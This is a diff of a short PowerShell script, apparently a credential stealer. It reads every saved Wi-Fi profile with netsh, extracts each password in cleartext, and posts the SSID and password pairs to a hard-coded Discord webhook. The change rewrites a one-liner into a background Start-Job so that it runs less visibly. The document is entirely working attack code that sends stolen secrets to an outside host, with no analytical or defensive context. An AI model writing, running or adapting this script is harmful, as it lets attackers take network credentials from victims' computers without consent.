@@ -1,1 +1,19 @@
-$webhook='https://discord.com/api/webhooks/1468242499423440939/C9eN3MnNZiTvq6Nowguis-njCEiEDybJ_tqNDemEIj0ckhAn55OfkQRxHihbnEA4ZWed'; $profiles=netsh wlan show profiles | Select-String 'All User Profile' | ForEach-Object { ($_ -split ':',2)[1].Trim() }; foreach($ssid in $profiles){ $pwdLine=netsh wlan show profile name="$ssid" key=clear | Select-String 'Key Content' -ErrorAction SilentlyContinue; if(-not $pwdLine){continue}; $pwd=($pwdLine.ToString() -split ':',2)[1].Trim(); $msg="SSID: $ssid | Password: $pwd"; $body=[PSCustomObject]@{content=$msg}; Invoke-RestMethod -Uri $webhook -Method Post -ContentType 'application/json' -Body ($body | ConvertTo-Json) }
+Start-Job -ScriptBlock {
+    $webhook = 'https://discord.com/api/webhooks/1468242499423440939/C9eN3MnNZiTvq6Nowguis-njCEiEDybJ_tqNDemEIj0ckhAn55OfkQRxHihbnEA4ZWed'
+
+    $profiles = netsh wlan show profiles |
+      Select-String 'All User Profile' |
+      ForEach-Object { ($_ -split ':',2)[1].Trim() }
+
+    foreach ($ssid in $profiles) {
+        $pwdLine = netsh wlan show profile name="$ssid" key=clear |
+                   Select-String 'Key Content' -ErrorAction SilentlyContinue
+        if (-not $pwdLine) { continue }
+
+        $pwd = ($pwdLine.ToString() -split ':',2)[1].Trim()
+        $msg = "SSID: $ssid | Password: $pwd"
+
+        $body = [PSCustomObject]@{ content = $msg }
+        Invoke-RestMethod -Uri $webhook -Method Post -ContentType 'application/json' -Body ($body | ConvertTo-Json)
+    }
+}
